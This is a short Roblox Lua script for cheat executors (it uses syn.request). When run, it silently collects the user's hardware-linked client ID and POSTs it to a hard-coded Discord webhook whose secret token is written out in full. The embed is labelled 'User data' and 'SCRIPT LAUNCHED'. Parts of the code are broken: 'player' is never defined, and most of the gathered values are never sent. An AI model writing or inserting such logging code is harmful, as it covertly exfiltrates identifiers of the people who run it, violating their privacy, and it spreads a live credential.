local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local playername = player.name
local GameId = game.PlaceId
local PlayerId = player.CharacterAppearanceId
local Content = '';
local Embed = {
    title = 'Данные Пользователя';
    color = 5814783;
    footer = { text = game.JobId };
    author = {
        name = 'СКРИПТ ЗАПУЩЕН';
        url = '';
    };
    fields = {
        {
            name = 'HWID:';
            value = HWID;
        };
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1466831806975311922/6rMY7BaobM2P3q4zqNrQe9T0i0zpBxiT_5Lmhrot0P9YuVPFEWbB0bKz9yiVNf9ujZ13';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService('HttpService'):JSONEncode({ content = Content; embeds = { Embed } });
}; 
